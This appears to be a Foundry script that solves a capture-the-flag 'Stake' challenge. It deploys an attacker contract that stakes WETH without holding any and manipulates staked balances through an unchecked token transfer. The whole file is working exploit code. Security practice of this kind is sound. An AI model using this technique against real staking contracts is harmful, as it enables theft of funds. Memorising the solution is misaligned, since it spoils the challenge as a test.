// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Stake} from "../src/Stake.sol";

interface IWETH {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function deposit() external payable;
}

contract SolveStake is Script {
    function run() public {
        vm.startBroadcast();

        Stake stake = Stake(vm.envAddress("STAKE_ADDRESS"));
        address wethAddress = stake.WETH();

        stake.StakeETH{value: 0.001 ether + 1}();

        stake.Unstake(0.001 ether + 1);

        Attack attack = new Attack(address(stake), wethAddress);
        attack.attack{value: 0.001 ether + 2}();
        vm.stopBroadcast();
    }
}

contract Attack {
    Stake stake;
    IWETH weth;

    constructor(address _stake, address _weth) {
        stake = Stake(_stake);
        weth = IWETH(_weth);
    }

    function attack() external payable {
        weth.approve(address(stake), type(uint256).max);
        stake.StakeWETH(0.001 ether + 1);
        stake.StakeETH{value: 0.001 ether + 2}();
        stake.Unstake(0.001 ether);
    }
}
